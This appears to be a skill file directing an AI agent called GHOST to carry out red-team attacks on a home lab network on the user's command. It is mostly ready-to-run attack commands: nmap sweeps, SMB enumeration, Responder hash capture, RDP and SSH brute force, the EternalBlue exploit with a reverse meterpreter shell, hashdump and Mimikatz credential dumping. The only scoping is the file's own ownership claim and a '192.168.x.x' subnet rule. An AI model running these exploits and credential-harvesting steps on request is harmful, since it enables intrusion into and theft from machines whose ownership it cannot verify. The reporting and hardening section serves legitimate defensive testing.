---
name: redteam-local-sim
description: "Red team / blue team attack simulation on an isolated private LAN. Use when: Lee wants GHOST to perform network reconnaissance, vulnerability scanning, and simulated exploitation against target machines on his local lab network. All targets are Lee's own devices on a closed network — no internet-facing attacks, no third-party systems. Use to: map the network, identify open ports/services, simulate attack vectors, report findings for defensive hardening."
---

# Red Team Local Simulation — GHOST Attack Playbook

This skill runs a structured red team simulation on Lee's private lab network. The attacker machine is this PC. The target is another machine on the same LAN. No outside traffic. All devices belong to Lee.

---

## Phase 0 — Pre-Flight

Before anything else, confirm the lab is isolated:

```powershell
# Verify no default gateway routes to the internet
route print | findstr "0.0.0.0"
# Should only see internal subnet routes, not an ISP gateway
```

Identify your own IP and subnet:
```powershell
ipconfig | findstr "IPv4"
# Example result: 192.168.1.50 — your subnet is 192.168.1.0/24
```

---

## Phase 1 — Network Reconnaissance

### 1a. Discover All Live Hosts
```bash
# Full subnet sweep — find every device on the network
nmap -sn 192.168.1.0/24

# Save results
nmap -sn 192.168.1.0/24 -oN Z:/openclaw/workspace/redteam/recon-hosts.txt
```

Expected devices to find:
- Both desktops
- Raspberry Pi
- Laptops (when on)
- Android phones/tablets (when on WiFi)
- iPhones (when on WiFi)
- Router

### 1b. OS Fingerprinting
```bash
# Identify OS on each discovered host
nmap -O 192.168.1.0/24 --osscan-guess

# Target a specific machine
nmap -O 192.168.1.TARGET_IP
```

### 1c. Port Scan Target Machine
```bash
# Full port scan on target desktop
nmap -sS -sV -p- 192.168.1.TARGET_IP -oN Z:/openclaw/workspace/redteam/target-ports.txt

# Fast scan (top 1000 ports first)
nmap -sV --open 192.168.1.TARGET_IP
```

Key ports to look for:
| Port | Service | Attack Vector |
|------|---------|---------------|
| 445 | SMB | EternalBlue, credential relay |
| 3389 | RDP | Brute force, BlueKeep |
| 5985/5986 | WinRM | PowerShell remoting |
| 22 | SSH | Brute force (Linux/Pi targets) |
| 80/443 | HTTP/S | Web exploits |
| 8080 | Alt HTTP | Admin panels |
| 135/139 | RPC/NetBIOS | Enumeration |

---

## Phase 2 — Enumeration

### 2a. SMB Enumeration (Windows targets)
```bash
# Enumerate shares and users
nmap --script smb-enum-shares,smb-enum-users 192.168.1.TARGET_IP

# Check for known vulnerabilities
nmap --script smb-vuln* 192.168.1.TARGET_IP
```

### 2b. Service Version Enumeration
```bash
# Deep service scan
nmap -sV --version-intensity 9 192.168.1.TARGET_IP
```

### 2c. Raspberry Pi (Linux target)
```bash
# SSH banner grab
nmap -sV -p 22 192.168.1.PI_IP

# Check for open services
nmap -A 192.168.1.PI_IP
```

---

## Phase 3 — Vulnerability Assessment

### 3a. Run Metasploit Auxiliary Scanners
```bash
msfconsole -q

# Inside msfconsole:
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.TARGET_IP
run

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run
```

### 3b. Windows Credential Attacks (Lab Only)
```bash
# SMB relay with Responder (run on attacker machine)
# Requires Responder installed — captures NTLM hashes when target browses network
python Responder.py -I "Local Area Connection" -rdw

# Brute force RDP (if port 3389 open)
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.TARGET_IP
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 3c. Raspberry Pi SSH Brute Force Simulation
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.PI_IP
set USERNAME pi
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
# Default Pi password is 'raspberry' — should hit immediately
```

---

## Phase 4 — Exploitation (Simulated)

### 4a. EternalBlue (MS17-010) — if vulnerable
```bash
# Inside msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.TARGET_IP
set LHOST 192.168.1.ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### 4b. Post-Exploitation with Meterpreter
```bash
# Once you have a meterpreter shell:
sysinfo          # System info
getuid           # Current user
hashdump         # Dump password hashes
screenshot       # Take screenshot of target desktop
shell            # Drop into cmd.exe
```

### 4c. Mimikatz (Credential Harvesting Simulation)
```powershell
# Run on TARGET machine (or via meterpreter)
# Dumps plaintext credentials from memory
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

---

## Phase 5 — Report Findings

After each simulation run, write results to:
```
Z:/openclaw/workspace/redteam/FINDINGS.md
```

Report format:
```markdown
# Red Team Report — [DATE]

## Target: [IP] [Hostname]
## Attacker: [IP]

### Open Ports / Services
[nmap results]

### Vulnerabilities Found
[CVEs, weak configs, open shares]

### Successfully Exploited
[What got in, how]

### Credentials Obtained
[Users, hashes — for Lee's lab records only]

### Defensive Recommendations
[What to patch/close to harden the target]
```

Always Telegram Lee the summary when done:
```
openclaw message send --channel telegram --target "@MAX_MAX_MAX_BOT_BOT" --message "Red team sim complete. Findings at Z:/openclaw/workspace/redteam/FINDINGS.md. Summary: [X open ports, Y vulns, Z exploited]"
```

---

## Tools Installation (run once on attacker machine)

```powershell
# Nmap (Windows)
winget install nmap

# Metasploit Framework
winget install Rapid7.Metasploit

# On Kali Linux / WSL (recommended for full toolset):
sudo apt update && sudo apt install -y metasploit-framework nmap responder hydra john mimikatz

# Wordlists
sudo apt install -y wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Lab Network Reference

Update these before each session:

| Device | IP | OS | Role |
|--------|----|----|------|
| Desktop 1 (Attacker) | 192.168.1.__ | Windows 11 | MAX runs here |
| Desktop 2 (Target) | 192.168.1.__ | Windows 11 | Primary target |
| Raspberry Pi | 192.168.1.__ | Raspberry Pi OS | Linux target |
| Laptop 1 | 192.168.1.__ | — | Secondary target |
| Laptop 2 | 192.168.1.__ | — | Secondary target |

Fill in IPs after running Phase 1 recon. Save to `Z:/openclaw/workspace/redteam/lab-map.md`.

---

## GHOST Standing Orders

When Lee says "run red team" or "attack [device]":
1. Run Phase 1 recon first — always map before attacking
2. Document every finding in FINDINGS.md
3. Never touch devices outside 192.168.x.x subnet
4. Report to Telegram when done
5. Suggest one defensive fix per vulnerability found
